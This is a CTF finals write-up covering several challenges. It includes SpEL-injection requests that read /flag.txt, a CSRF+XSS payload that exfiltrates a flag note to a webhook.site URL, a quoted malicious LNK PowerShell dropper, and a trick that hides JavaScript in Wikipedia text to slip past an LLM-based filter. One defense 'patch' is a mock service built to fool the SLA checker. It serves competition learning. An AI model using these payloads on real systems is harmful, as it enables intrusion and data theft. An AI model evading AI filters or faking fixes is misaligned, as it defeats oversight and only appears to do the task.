# UM Cybersecurity Summit Finals - Writeup
A unique on-site CTF experience where it spans for 2 days and features a Jeopardy-Defense style. The defense challenge requires us to fix the challenge but interestingly they also have linux binary challenges prepared for us to patch.

It totals in around 19 mostly decent challenges which is quite balanced.  
The writeup for this is kept simple as there are not a lot of interesting things to write.

## Table of Contents
* [**Defense**](#defense)
  * [**Card Shop** - CSRF + SPEL injection](#card-shop)
  * [**babysc\_note** (Defense)](#babysc_note-defense)
* [**Web**](#web)
  * [**Protected 0 Day HTML Renderer** - Browsershot arbitrary file read](#protected-0-day-html-renderer)
  * [**S1MPL3 N0T3S** - CSRF with XSS](#s1mpl3-n0t3s)
* [**Reverse Engineering**](#reverse-engineering)
  * [**local** - Reading Android SQLite](#local)
  * [**crackme** - UPX + Rust reverse](#crackme)
* [**Forensics**](#forensics)
  * [**Shortcut to Flag** - LNK file forensic](#shortcut-to-flag)
* [**Crypto**](#crypto)
  * [**quantum-web-token** (Just vibe solve it)](#quantum-web-token-vibe-solved)

## Defense
### Card Shop
A Spring project with fastify as reverse proxy.

#### Source Code Analysis
In `card_shop_player\backend\src\main\java\com\example\cardshop\controller\CardGeneratorController.java`, SPEL injection vulnerability is obvious.
```java
private static final SpelExpressionParser PARSER = new SpelExpressionParser();
[snip]
        if (isShadow()) {
            if (raw != null) {
                p.setAbility(raw);
                p.setAbility(PARSER.parseExpression(raw, CTX).getValue(String.class));
            }
        }
[snip]
    private boolean isShadow() {
        return "true".equalsIgnoreCase(env.getProperty("SHADOW_ENABLE"));
    }
```
In `card_shop_player\backend\src\main\resources\application.yml`, modification of env variables through POST to `actuator/env` was enabled.
```yaml
  endpoint:
    env:
      post:
        enabled: true
```
In `card_shop_player\proxy\index.js`, the GET/POSTed ID are forwarded to the origin server in path, enabling directory traversal. (and therefore the access of `actuator/env`)
```py
fastify.get('/pokemon', (r, s) => {
    const id = r.query.id || ''
    return forward(r, s, 'GET', `/pokemon/${id}`)
})
fastify.post('/abilities', (r, s) => {
    const id = r.body.id || ''
    return forward(r, s, 'POST', `/pokemon/${id}/abilities`)
})
```

To exploit just POST relevant variables to the env.
```http
POST /abilities HTTP/1.1
Host: 116.203.176.73:50805
Content-Type: application/json
Content-Length: 68

{"id": "../actuator/env#", "name":"SHADOW_ENABLE", "value":"true"}
```
```http
POST /abilities HTTP/1.1
Host: 116.203.176.73:50805
Content-Type: application/json
Content-Length: 155

{"id": "../actuator/env#", "name":"SPECIAL_ABILITY", "value":"#{new String(T(java.nio.file.Files).readAllBytes(T(java.nio.file.Paths).get('/flag.txt')))}"}
```
#### Patching
At first I thought expression evaluation is a feature so I patched the SPEL with a `SimpleEvaluationContext` that still evaluate values but are immune to RCE.
```java
if (isShadow()) {
    SimpleEvaluationContext context = SimpleEvaluationContext.forReadOnlyDataBinding().build();
    Expression expressionToEvaluate = PARSER.parseExpression(raw);
    p.setAbility(expressionToEvaluate.getValue(context, parameter, String.class));
}
```
and it fails, -50.

Then I just return whatever the user input as raw string, maybe the checker expect no evaluation.
```java
if (isShadow()) {
     String raw = env.getProperty("SPECIAL_ABILITY");
     if (raw != null) {
         p.setAbility(raw);
     }
}
```
it fails again, -50.

Then I solved the attack part and got the SLA script. Apparently it checks like this:
```py
        r2 = requests.post(f"{base}/abilities", json={
            "id": "../../actuator/env#",
            "name": "SPECIAL_ABILITY",
            "value": '#{"suppppperrrrrrreeassssyyyyychallllennnnggeeeee"}'
        }, timeout=5)
        if r2.status_code != 200:
            return STATUS_DOWN
[snip]
        if "suppppperrrrrrreeassssyyyyychallllennnnggeeeee" in r3.text:
            return STATUS_UNPATCHED
        else:
            return STATUS_PATCHED
```

I feel 🤡 so here is my actual patch.
```java
if (isShadow()) {
    p.setName("Shadow " + p.getName());
    p.getTypes().add("Dark");
    // String raw = env.getProperty("SPECIAL_ABILITY");
    // if (raw != null) {
        // p.setAbility(PARSER.parseExpression(raw, CTX).getValue(String.class));
    // }
}
```
![image](https://github.com/user-attachments/assets/83e40d61-9abf-499d-b9e1-b4244c855056)

### babysc_note (Defense)
#### Attack
tbh i never understood it, shoutout to capang for the effort to make it unGPTable.

#### Defense
From what I learned from the SLA script above, it is probably doing dumb checks here as well. So how to patch without knowing what it's doing?

Simple, you mock it with a script that does nothing ;)
```python
#!/usr/bin/env python3

NOTE_MAX_SIZE = 1023


def display_menu():
    """Prints the main menu and gets user choice."""
    print("\n== babysc Note ==")
    print("1. Add note")
    print("2. Show parts of corrupted note")
    print("3. Quit")
    choice = input("> ")
    return choice


def add_note_handler():
    """Handles the 'Add note' functionality."""
    global note_content, note_allocated_size

    try:
        size_str = input(f"Enter size (max {NOTE_MAX_SIZE} chars): ")

        if not (0 < int(size_str) <= NOTE_MAX_SIZE):
            print("[!] Size too big.")
            exit(1)

        input()
        print("[+] Note saved.")
        print("[+] Note corrupted.")

    except ValueError:
        print("[-] Invalid input for size. Please enter a number.")
    except Exception as e:
        print(f"[-] An error occurred: {e}")


def show_note_handler():
    """Handles the 'Show parts of corrupted note' functionality."""
    global note_content, note_allocated_size

    print("\n--- Corrupted notes in hex---")
    try:
        offset_str = input("Enter part of the note to view: ")
        offset = int(offset_str)
    finally:
        # dont care
        print(f"At {offset}: 00")


def main():
    """Main loop for the application."""
    while True:
        choice = display_menu()
        if choice == '1':
            add_note_handler()
        elif choice == '2':
            show_note_handler()
        elif choice == '3':
            print("Bye!")
            break
        else:
            print("[!] Unknown option.")


if __name__ == "__main__":
    main()
```
```Dockerfile
FROM ubuntu:22.04 AS app
RUN apt-get update && apt-get install -y python3

FROM pwn.red/jail

COPY --from=app / /srv
COPY ./mock.py /srv/app/run
EXPOSE 10001

RUN chmod +x /srv/app/run

# Jail environment settings
ENV JAIL_PORT=10001 \
    JAIL_MEM=256M \
    JAIL_ENV_NUM=5 \
    JAIL_PID=20 \
    JAIL_TIME=1200
```
![image](https://hackmd.io/_uploads/BkUNGQ_Wxl.png)


## Web
### Protected 0 Day HTML Renderer
> [!IMPORTANT]  
> The Browsershot vulnerability info itself is withheld for now since it's still technically 0-day, but it's a simple one.  
> It will be added once things cleared.

So [REDACTED] has this arbitrary file read vuln. Running it locally with deepseek check removed with the payload does let us perform arbitrary file read.
```html
<script>document.REDACTED([REDACTED])</script>
```

So the only work left is to bypass deepseek. The way I gone with is to spam it with the long text of [Tartan article](https://en.wikipedia.org/wiki/Tartan) and hide the one line js in the middle.
```html
<script>
/*Tartan (Scottish Gaelic: breacan [ˈpɾʲɛxkən]) is a patterned cloth consisting of crossing horizontal and vertical bands in multiple colours, forming repeating symmetrical patterns known as setts. Originating in woven wool, tartan is most strongly associated with Scotland, where it has been used for centuries in traditional clothing such as the kilt. Historically, specific tartans were linked to Scottish clans, families, or regions, with patterns and colours derived from local dyes. The earliest surviving samples of tartan-style cloth are around 3,000 years old and were discovered in Xinjiang, China.
[many many lines]
The Cockburn Collection of 56 tartan samples (some of them duplicates) was put together between 1810 and c. 1825 (most likely 1816–25)[516][398] by Lt.-Gen. Sir William Cockburn, and is now in the Mitchell Library in Glasgow.[398][517] This collection does ascribe particular family names to many of these setts (probably naming them after prominent individuals),[516] but only sometimes corresponding to current clan tartan associations (indeed, some patterns that are today associated with particular clans were given multiple different names in the Cockburn Collection).[bt] There are many conflicts in name-to-pattern associations between this collection and that of the Highland Society of London around the same time.[516]
*/document.REDACTED([REDACTED])/*
Even David Stewart of Garth, who was to become one of the chief proponents of the idea of clan tartans, observed in 1814 only that various heads of families seemed to have selected personal tartans and that there were also district tartans.[519] When Garth and his Highland Society of London solicited clan tartans from chiefs in 1815 (see below), Col. Alexander Robertson of Struan, Chief of Clan Robertson/Donnachaidh/Duncan, wrote back:[520]
[many many lines]
*/
</script>
```
![image](https://github.com/user-attachments/assets/80320d3b-4cd1-4f2a-b4b1-84598862423a)  
![image](https://hackmd.io/_uploads/SkzmVmOZxl.png)

### S1MPL3 N0T3S
It's a web challenge with a bot, which means it's a XSS challenge. The bot will create a note each time on login, which contain the flag. One thing to note is that report doesn't have any host filtering and it's possible to make the bot visit any URL.

After a few hours pondering this seemingly impossible challenge, I devised the following attack plan:
1. Let bot create note 1 (flag), then from our server, CSRF make bot create malicious note 2.
2. Enable unsafe for note 2 and redir to it, and once our note 2 XSS is run, it fetch note 1 content and post to attacker server.

We host all the html payloads on our server, and send the bot first stage to create a malicious note under its account.
```html
<!DOCTYPE html>
<html>

<head>
    <title>Stage 1: Create XSS Note</title>
</head>

<body onload="document.csrfForm.submit()">
    <p>Stage 1: Creating malicious note...</p>
    <form name="csrfForm" method="POST" action="http://127.0.0.1:7189/dashboard">
        <input type="hidden" name="content" id="xss_payload_content">
    </form>
    <script>
        const xssPayload = `
            <p>XSS note is active!</p>
            <script>
                async function stealFlag() {
                    try {
                        // Fetch the bot's first note (the flag note)
                        // This runs in the bot's browser on 127.0.0.1:7189
                        // so it's a same-origin request with bot's cookies.
                        // The /notes/1 page will render the flag unescaped
                        // because 'isUnsafe' will be true for the bot's session.
                        const response = await fetch('/notes/1'); 
                        const noteHtml = await response.text();

                        const parser = new DOMParser();
                        const doc = parser.parseFromString(noteHtml, 'text/html');
                        const flagElement = doc.querySelector('.note-content');
                        let flag = 'FLAG_NOT_FOUND';
                        if (flagElement) {
                            flag = flagElement.textContent.trim();
                        }
                        
                        // Send it to your server
                        fetch('//webhook.site/fb0d5679-6526-4c8a-8e5a-85b23740bdb7/?flag=' + encodeURIComponent(flag));

                    } catch (e) {
                        fetch('//webhook.site/fb0d5679-6526-4c8a-8e5a-85b23740bdb7/?error=' + encodeURIComponent(e.toString()));
                    }
                }
                stealFlag();
            <\/script> 
        `; // The <\/script> is to avoid breaking the outer script tag if this were inline.
        document.getElementById('xss_payload_content').value = xssPayload;
    </script>
</body>

</html>
```
Then, let it visit the malicious note so under same origin the script can read the note and send to us with a prefetch request. Since `/prefs/unsafe` automatically redirects to the note ID submitted, there is no need for additional logic.
```html
<!DOCTYPE html>
<html>

<head>
    <title>Stage 2: Trigger XSS</title>
</head>

<body onload="document.csrfForm.submit()">
    <p>Stage 2: Enabling unsafe mode and viewing XSS note...</p>
    <form name="csrfForm" method="POST" action="http://127.0.0.1:7189/prefs/unsafe">
        <input type="hidden" name="enable" value="1">
        <!-- This 'id' should be the user_note_id of the bot_xss_note created in Stage 1.
             Assuming it's the second note the bot creates for itself, its id will be 2. -->
        <input type="hidden" name="id" value="3">
    </form>
</body>

</html>
```
![image](https://github.com/user-attachments/assets/af7cbefe-5056-47c8-b3b8-de4b7dcfef3b)

## Reverse Engineering
### local
After decompiling it, in `definitely.notvulnerable.local.DatabaseHelper`, we can see that the app creates a `users` table in local SQLite database and inserts a default user with username `admin`. The password is the flag.
```java
public void onCreate(SQLiteDatabase db) {
    db.execSQL("CREATE TABLE users (id INTEGER PRIMARY KEY AUTOINCREMENT, username TEXT NOT NULL, password TEXT NOT NULL);");
    ContentValues contentValues = new ContentValues();
    contentValues.put("username", "admin");
    contentValues.put("password", InsecureProvider.Companion.getFlag());
    db.insert(InsecureProvider.TABLE_NAME, null, contentValues);
}
```

We then install the APK and register a random user to ensure the database gets created.
Next, use `adb` to extract the database directly from the app’s internal storage:
```bash
adb exec-out run-as definitely.notvulnerable.local cat /data/data/definitely.notvulnerable.local/databases/insecure_db > insecure_db
```

Opening `insecure_db` with any editor reveals the following string with the flag, which is the user `admin` and its password.
```
adminumcs{53c6f74ef6dc39e9ff65b62b7d0dc628258da0e5002cddd112c97ab2d6876c20cfd57a2d7ec6fa51603f954b5caf3fe486a08e5d37d9c619bc0da307fb2ed426}
```

### crackme
Running UPX-Analyser on crackme.exe shows that it is UPX 5.01 packed, a VERY new version.  
![image](https://hackmd.io/_uploads/B1QDH7d-ex.png)  
So we download the [latest upx](https://github.com/upx/upx/releases/tag/v5.0.1) and unpack with `upx -d crackme.exe`

Then open it in IDA we can see all code. Tracing from string of `UMCS{`, we can xref to the main logic `sub_140001C0D`.  
![image](https://hackmd.io/_uploads/rk9bP7uWxx.png)

From there, we can copy and paste all relevant functions to LLM to analyse the logic and write us a solve script.
```py
import struct
import hashlib

# --- Input Data from IDA Script ---
encrypted_xor_key_operand_bytes = bytes([0xA2, 0xDE, 0xFF, 0x0A, 0xA4, 0x3D, 0x4F, 0xBE])
encrypted_key_len_operand_bytes = bytes([0x5E, 0x93, 0xFB, 0x33, 0x60, 0xA3, 0xF3, 0xCA])

# --- Constants from .rdata and analysis ---
# For XOR Key
byte_14001A750_qword_data = bytes([0xFD, 0x81, 0x8A, 0x47, 0xC7, 0x6E, 0x10, 0xE1])
xor_mask_for_key_qword = 0xE1106EC7478A8100

# For Key Length Modulo (v96.m256i_i64[0] comes from String[8] after decryption)
# String[8] is derived from *(v26 + 16) ^ *(byte_14001A619 + 16)
# My previous analysis for byte_14001A619_data_offset32 was targeting String[16] or offset 32.
# Let's correct this: v96.m256i_i64[0] = String[8] is correct.
# String[8] (a QWORD) is formed by *(_QWORD *)(v26 + 8*2) ^ *(_QWORD *)&byte_14001A619[8*2]
# String[8] is the QWORD at offset 16 in the String buffer.
# So the relevant bytes from byte_14001A619 are byte_14001A619[16] through byte_14001A619[23]
byte_14001A619_relevant_qword_data = bytes([
    0x29, 0xFA, 0x97, 0x5F, 0x40, 0xC2, 0x83, 0xBA
])


# Target Ciphertext (22 bytes)
# xmmword_14001A430: 6B002A173E002D002B6B3B1712016F31h (as 16 LE bytes)
# LODWORD(v100) = 2098734641 (0x7D18C631) (as 4 LE bytes)
# WORD2(v100) = 24593 (0x6011) (as 2 LE bytes)
target_ciphertext = bytes([
    0x31, 0x6F, 0x01, 0x12, 0x17, 0x3B, 0x6B, 0x2B,
    0x00, 0x2D, 0x00, 0x3E, 0x17, 0x2A, 0x00, 0x6B,
    0x31, 0xC6, 0x18, 0x7D,
    0x11, 0x60
])

# --- Calculations ---

# 1. Derive the 8-byte XOR Key
# XOR_KEY_QWORD = (*(QWORD*)EffectiveAddress1) ^ (*(QWORD*)byte_14001A750_data | 0xE1106EC7478A8100ui64)
val_encrypted_xor_key_op = struct.unpack("<Q", encrypted_xor_key_operand_bytes)[0]
val_byte_14001A750 = struct.unpack("<Q", byte_14001A750_qword_data)[0]

derived_xor_key_qword = val_encrypted_xor_key_op ^ (val_byte_14001A750 | xor_mask_for_key_qword)
xor_key_bytes = struct.pack("<Q", derived_xor_key_qword)

print(f"Encrypted XOR Key Operand (from EffectiveAddress1): 0x{val_encrypted_xor_key_op:016X}")
print(f"byte_14001A750 QWORD: 0x{val_byte_14001A750:016X}")
print(f"Mask for key QWORD: 0x{xor_mask_for_key_qword:016X}")
print(f"Intermediate for key: 0x{(val_byte_14001A750 | xor_mask_for_key_qword):016X}")
print(f"Derived 8-byte XOR Key: {xor_key_bytes.hex().upper()}")

# 2. Derive the Key Length Modulo (v96.m256i_i64[0])
# This value is what's stored in v96.m256i_i64[0] after the "4th string decryption".
# v96.m256i_i64[0] = String[8] (the QWORD at offset 16 bytes in the String buffer)
# String[8] = (*(QWORD*)(v26_ptr + 16)) ^ (*(QWORD*)&byte_14001A619[16]);
# where v26_ptr + 16 corresponds to where encrypted_key_len_operand_bytes was read from.

val_encrypted_key_len_op = struct.unpack("<Q", encrypted_key_len_operand_bytes)[0]
val_byte_14001A619_relevant = struct.unpack("<Q", byte_14001A619_relevant_qword_data)[0]

key_length_modulo = val_encrypted_key_len_op ^ val_byte_14001A619_relevant
# This should be an integer, likely 8.
# The actual value stored in v96.m256i_i64[0] is this QWORD.
# The code uses it as `v63 % v96.m256i_i64[0]`. If it's a small integer like 8, it works.
# If it's a large QWORD, the modulo might behave unexpectedly unless it's meant to be a bitmask.
# Given the context, it's highly probable it's a small integer.

print(f"\nEncrypted Key Len Operand (from EffectiveAddress2): 0x{val_encrypted_key_len_op:016X}")
print(f"byte_14001A619 relevant QWORD: 0x{val_byte_14001A619_relevant:016X}")
print(f"Derived Key Length Modulo Value (QWORD): 0x{key_length_modulo:016X}")
# Let's assume it's meant to be small for the modulo.
# The comparison was `v53 != 22`. And then `v63 != 22`.
# `*(_BYTE *)(*((_QWORD *)&v95 + 1) + v63 % v96.m256i_i64[0])`
# `*((_QWORD *)&v95 + 1)` points to the `derived_xor_key_qword`.
# So, we need `xor_key_bytes[v63 % key_length_modulo_integer]`
# For now, let's check if key_length_modulo is indeed 8.
key_len_for_xor_op = int(key_length_modulo)  # Convert QWORD to int; will only work if it's small
print(f"Interpreted Key Length for XOR operation: {key_len_for_xor_op}")

if key_len_for_xor_op != 8:
    print("WARNING: Key length modulo is not 8. This might be an issue or my interpretation of its derivation is slightly off for the modulo part.")
    # However, the XOR key itself is 8 bytes, so it's most likely 8.
    # The logic that populates v96.m256i_i64[0] is what we calculated.
    # It's possible the value is 8 and the QWORD form is just how it's stored.

# Forcing it to 8 for now as it's the most logical for an 8-byte key.
# If the derived key_length_modulo is not 8, the flag will be wrong.
# The crucial part is the xor_key_bytes itself.
actual_key_len_for_op = 8
if key_len_for_xor_op != actual_key_len_for_op:
    print(f"INFO: Forcing key length for XOR to {actual_key_len_for_op} as it's most likely.")


# 3. Reverse the XOR to get the Flag
flag_bytes = bytearray()
for i in range(len(target_ciphertext)):
    flag_byte = target_ciphertext[i] ^ xor_key_bytes[i % actual_key_len_for_op]
    flag_bytes.append(flag_byte)

try:
    print("\nFlag bytes:", flag_bytes)
    flag_string = flag_bytes.decode('ascii')  # Or 'utf-8' if it contains non-ASCII
    print(f"Recovered Flag (22 bytes): {flag_bytes.hex().upper()}")
    print(f"Recovered Flag (string): {flag_string}")
except UnicodeDecodeError:
    print(f"\nRecovered Flag (22 bytes): {flag_bytes.hex().upper()}")
    print("Flag bytes could not be decoded as ASCII/UTF-8.")


# 4. (Optional) MD5 Verification
# MD5 initial state (from xmmword_14001A440, little-endian words)
# 67452301 EFCDAB89 98BADCFE 10325476
md5_initial_state_le_words = [0x67452301, 0xEFCDAB89, 0x98BADCFE, 0x10325476]

# The program uses a custom-looking MD5 update/transform (sub_1400066BA)
# Re-implementing that perfectly is complex.
# Let's use Python's standard hashlib.md5 for a quick check.
# The custom one might have different padding or endianness in processing.

md5_hash = hashlib.md5(flag_bytes).hexdigest()
print(f"\nStandard MD5 Hash of the recovered flag: {md5_hash}")

# The program calculates its hash and then converts it to a string.
# The specific string conversion sub_140006FDA and sub_140002C10 would be needed
# to exactly match the output format if it's not plain hex.
# The formatting of the hash in sub_140006FDA looked like it might be custom.
# It iterated 16 times, calling sub_140003E00 (likely a formatting function for each byte of the 16-byte hash).

print("\n--- End of Script ---")
```
Some values inside might be wrong, but it's okay we know `\x99` should be `y`.  
![image](https://github.com/user-attachments/assets/e5bd85e5-11d4-41b2-9f88-16966e91adf7)

In the end we will get `n0t_th4t_rusty_4nym0r3`, which is not the flag. We need to `Check` with the string to get the final flag.
![image](https://hackmd.io/_uploads/HydpPQdZee.png)

## Forensics
### Shortcut to Flag
Running lnkinfo we get this.
```!
Name: Type: Text Document
Size: 5.23 KB
Date modified: 01/02/2025 11:23
Arguments: /c start notepad C:\%HOMEPATH%\AppData\Local\Microsoft\Edge\User Data\ZxcvbnData\3.1.0.0\passwords.txt && powershell -windowstyle hidden $lnkpath = Get-ChildItem *.lnk ^| where-object {$_.length -eq 0x000021E4} ^| Select-Object -ExpandProperty Name; $file = gc $lnkpath -Encoding Byte; for($i=0; $i -lt $file.count; $i++) { $file[$i] = $file[$i] -bxor 0x38 }; $path = '%temp%\tmp' + (Get-Random) + '.exe'; sc $path ([byte[]]($file ^| select -Skip 003044)) -Encoding Byte; ^& $path;
Icon Location: %windir%\system32\notepad.exe

--- Extra blocks information ---

>> Environment variable data block
   Environment variables: %windir%\system32\cmd.exe


---------- Processed C:\Users\USER\Downloads\password_chall\password.lnk in 0.04244620 seconds ----------
```

The interesting part is on the arguments, which seems to construct an exe and execute it. Flattening the code we get this.
```ps1
$lnkpath = Get-ChildItem *.lnk | where-object {$_.length -eq 0x000021E4} | Select-Object -ExpandProperty Name;
$file = gc $lnkpath -Encoding Byte; for($i=0; $i -lt $file.count; $i++) { $file[$i] = $file[$i] -bxor 0x38 };
$path = '%tmp%' + 'extracted' + '.exe';
sc $path ([byte[]]($file | select -Skip 003044)) -Encoding Byte;
```
which if we attempt to get the extracted exe, we will find it unreadable (not valid exe, no PE signature).

This took me a few hours to figure out but the **xor key is wrong** (???). Replacing `0x38` with `0x98` will extract the proper exe. We can guess this by XORing known PE signature with the original `bytes[3044:]`.

The exe itself is a .NET application so we can use [dnSpyEx](https://github.com/dnSpyEx/dnSpy) to decompile.
![image](https://hackmd.io/_uploads/H1dVoQu-ee.png)

Then just copy all code and dump to [your friendly neighbour GPT](https://chatgpt.com/share/68288762-20b0-8006-9659-1f92ac24b58f) to solve.

## Crypto
### quantum-web-token (Vibe solved)
Challenge code:
```py
import random
import socket
import time
import jwt
from qiskit import QuantumCircuit
from qiskit_aer import Aer, AerSimulator
from qiskit import transpile

n_qubits = 32
s_bases = [random.choice(['Z', 'X']) for _ in range(n_qubits)]
s_bits = [random.randint(0, 1) for _ in range(n_qubits)]

backend = Aer.get_backend('qasm_simulator')

HOST = '0.0.0.0'
PORT = 5001
SECRET_KEY = random.randbytes(16)
FLAG = "UMCS{<REDACTED>}"

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as server:
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind((HOST, PORT))
    server.listen(1)
    print(f"[+] Listening on port {PORT}...")

    conn, addr = server.accept()
    with conn:
        print(f"[+] Connection from {addr}")
        conn.sendall(b"Welcome to my bb84 simulator. This program will only transmit JWT tokens.\nSending qubits through quantum channel:\n")

        while True:
            r_bases = [random.choice(['Z', 'X']) for _ in range(n_qubits)]
            r_bits = []
            for i in range(n_qubits):
                qc = QuantumCircuit(1, 1)
                if s_bases[i] == 'Z':
                    if s_bits[i] == 1:
                        qc.x(0)
                else:
                    if s_bits[i] == 0:
                        qc.h(0)
                    else:
                        qc.x(0)
                        qc.h(0)

                if r_bases[i] == 'X':
                    qc.h(0)

                qc.measure(0, 0)

                new_cirq = transpile(qc, backend)
                job = backend.run(new_cirq)
                counts = job.result().get_counts()
                measured_bit = int(list(counts.keys())[0])
                r_bits.append(measured_bit)

            xor = [s_bits[i] ^ r_bits[i] for i in range(n_qubits)]

            for i in range(n_qubits):
                basis_a = s_bases[i].lower()
                basis_b = r_bases[i].lower()
                qwt = {"basis_a": basis_a, "basis_b": basis_b, "xor": xor[i]}
                qwt = jwt.encode(qwt, SECRET_KEY, algorithm="HS256")
                conn.sendall(qwt.encode() + b"\n")
                time.sleep(0.5)

            key_bits = []
            key_indices = []
            for i in range(n_qubits):
                if s_bases[i] == r_bases[i]:
                    key_bits.append(s_bits[i])
                    key_indices.append(i)

            p_key = {i: key_bits[j] for j, i in enumerate(key_indices)}
            conn.sendall(jwt.encode(p_key, SECRET_KEY, algorithm="HS256").encode() + b"\n")
            conn.sendall(b"Do you want somemore tokens? (y/n): ")
            response = conn.recv(1024).decode().strip().lower()
            if response != 'y':
                break

        conn.sendall(b"Guess Bob's qubits (comma as delimeter): ")
        guess = conn.recv(4096).decode().strip()
        try:
            guess_bits = list(map(int, guess.split(',')))
            if guess_bits == r_bits:
                conn.sendall(b"\033[32;1mFLAG: " + FLAG.encode() + b"\033[0m\n")
            else:
                conn.sendall(b"\033[31;1mFLAG: You have the worst guess ever.\033[0m\n")
        except:
            conn.sendall(b"Invalid input format.\n")

        print("[+] Connection closed.")
        conn.close()
```

Solution:  
Just dump it to LLM and get solve script.
```python
import random
import socket
import time
import jwt  # Ensure PyJWT is installed

# --- Configuration ---
HOST = '116.203.176.73'  # Change to remote host if necessary
PORT = 5001
N_QUBITS = 32
MAX_ROUNDS_S_BITS_COLLECTION = 10

# --- Helper Classes and Functions --- (Keep these as they are good)


class SocketBuffer:
    def __init__(self):
        self.data = b""


def recv_line(sock, sock_buffer_obj):
    while b'\n' not in sock_buffer_obj.data:
        try:
            chunk = sock.recv(4096)
            if not chunk:
                raise ConnectionError("Socket closed unexpectedly while reading line")
            sock_buffer_obj.data += chunk
        except socket.timeout:
            raise
    line, sock_buffer_obj.data = sock_buffer_obj.data.split(b'\n', 1)
    return line.strip()


def read_until_target_bytes(sock, sock_buffer_obj, target_bytes):
    while target_bytes not in sock_buffer_obj.data:
        try:
            chunk = sock.recv(1024)
            if not chunk:
                raise ConnectionError(
                    f"Socket closed while waiting for target: {target_bytes.decode(errors='ignore')}")
            sock_buffer_obj.data += chunk
        except socket.timeout:
            raise
    prompt_idx = sock_buffer_obj.data.find(target_bytes)
    sock_buffer_obj.data = sock_buffer_obj.data[prompt_idx + len(target_bytes):]


def decode_jwt_unverified(token_str):
    """Decodes a JWT token without verifying its signature."""
    try:
        header = jwt.get_unverified_header(token_str)
        # The server uses HS256, so we expect that in the header.
        # We need to pass the expected algorithm to decode.
        payload = jwt.decode(token_str, algorithms=[header['alg']], options={
                             "verify_signature": False})
        return payload
    except Exception as e:
        print(f"[!] Error decoding JWT unverified: {e}")
        print(f"    Token was: {token_str[:60]}...")
        return None

# --- Main Solve Logic ---


def solve():
    # SECRET_KEY is now assumed to be unknown and unneeded if unverified decode works.
    print("[+] Proceeding with unverified JWT decoding strategy.")

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((HOST, PORT))
        s.settimeout(240)
        sock_buffer = SocketBuffer()

        target_initial_sequence = b"Welcome to my bb84 simulator. This program will only transmit JWT tokens.\nSending qubits through quantum channel:\n"
        try:
            # print("[+] Attempting to read initial welcome messages...")
            while target_initial_sequence not in sock_buffer.data:
                chunk = s.recv(1024)
                if not chunk:
                    raise ConnectionError("Socket closed while reading initial greeting")
                sock_buffer.data += chunk
                if len(sock_buffer.data) > len(target_initial_sequence) + 2048:
                    print("[!] Accumulated too much data waiting for initial sequence. Aborting.")
                    return
            idx = sock_buffer.data.find(target_initial_sequence)
            if idx != -1:
                sock_buffer.data = sock_buffer.data[idx + len(target_initial_sequence):]
                # print(f"[+] Initial welcome messages consumed successfully.")
            else:
                print(f"[!] Could not find the target initial sequence. Aborting.")
                return
        except Exception as e:
            print(f"[!] Error during initial welcome message reception: {e}")
            return

        s_bits_revealed = [None] * N_QUBITS
        final_round_qwt_tokens_encoded = [None] * N_QUBITS  # Store the string tokens

        # print("[+] Starting s_bits collection phase...")
        for r_idx in range(MAX_ROUNDS_S_BITS_COLLECTION):
            print(f"  Round {r_idx + 1}/{MAX_ROUNDS_S_BITS_COLLECTION} for s_bits...")
            current_round_qwt_tokens_str_temp = []

            try:
                for i in range(N_QUBITS):
                    token_bytes = recv_line(s, sock_buffer)
                    current_round_qwt_tokens_str_temp.append(
                        token_bytes.decode())  # Store as string
                p_key_token_str = recv_line(s, sock_buffer).decode()  # Store as string
            except Exception as e:
                print(f"[!] Error during token reception in round {r_idx+1}: {e}")
                return

            final_round_qwt_tokens_encoded = list(current_round_qwt_tokens_str_temp)

            p_key_payload = decode_jwt_unverified(p_key_token_str)
            if p_key_payload is None:
                print("[!] Failed to decode p_key_token unverified. Aborting.")
                return

            # print(f"    Decoded p_key_payload (unverified): {p_key_payload}")
            for k_idx_str, bit_val in p_key_payload.items():
                s_bits_revealed[int(k_idx_str)] = bit_val

            revealed_count = sum(x is not None for x in s_bits_revealed)
            print(f"    Revealed s_bits count: {revealed_count}/{N_QUBITS}")

            target_prompt_bytes = b"Do you want somemore tokens? (y/n): "
            try:
                read_until_target_bytes(s, sock_buffer, target_prompt_bytes)
            except Exception as e:
                print(f"[!] Error receiving 'more tokens' prompt: {e}")
                return

            if all(s_val is not None for s_val in s_bits_revealed):
                print("  [+] All s_bits revealed. Sending 'n'.")
                s.sendall(b"n\n")
                break
            else:
                if r_idx == MAX_ROUNDS_S_BITS_COLLECTION - 1:
                    print(f"  Reached MAX_ROUNDS. Sending 'n'.")
                    s.sendall(b"n\n")
                else:
                    s.sendall(b"y\n")

        if not all(s_val is not None for s_val in s_bits_revealed):
            print("[!] Failed to reveal all s_bits. The guess might be incomplete/incorrect.")

        print("[+] Constructing r_bits guess for the final round...")
        guess_r_bits = [0] * N_QUBITS
        for i in range(N_QUBITS):
            if final_round_qwt_tokens_encoded[i] is None:
                print(f"    Error: qwt_token[{i}] was not captured. Cannot guess for this bit.")
                continue

            qwt_payload = decode_jwt_unverified(final_round_qwt_tokens_encoded[i])
            if qwt_payload is None:
                print(
                    f"[!] Failed to decode qwt_token[{i}] unverified. Skipping guess for this bit.")
                continue

            xor_val = qwt_payload['xor']
            s_bit_i = s_bits_revealed[i]
            if s_bit_i is None:
                print(f"    Critical Warning: s_bits[{i}] is unknown for guess. Assuming 0.")
                s_bit_i = 0
            guess_r_bits[i] = s_bit_i ^ xor_val

        target_guess_prompt_bytes = b"Guess Bob's qubits (comma as delimeter): "
        try:
            read_until_target_bytes(s, sock_buffer, target_guess_prompt_bytes)
        except Exception as e:
            print(f"[!] Error receiving guess prompt: {e}")
            return

        guess_str = ",".join(map(str, guess_r_bits))
        print(f"[+] Sending guess: {guess_str}")
        s.sendall(guess_str.encode() + b"\n")

        final_response_parts = []
        # print("[+] Waiting for final server response...")
        try:
            while True:
                chunk = s.recv(4096)
                if not chunk:
                    break
                final_response_parts.append(chunk)
                temp_resp = b"".join(final_response_parts)
                if any(m in temp_resp for m in [b"UMCS{", b"worst guess", b"Invalid input"]):
                    break
            final_response = b"".join(final_response_parts)
            if final_response:
                print(f"[+] Final server response: {final_response.decode(errors='ignore')}")
            else:
                print("[+] No final response received (connection closed by server).")
        except socket.timeout:
            final_response = b"".join(final_response_parts)
            print(
                f"[!] Timeout reading final server response. Partial data: {final_response.decode(errors='ignore')}")
        except Exception as e:
            print(f"[!] Error reading final server response: {e}")


if __name__ == '__main__':
    solve()
```
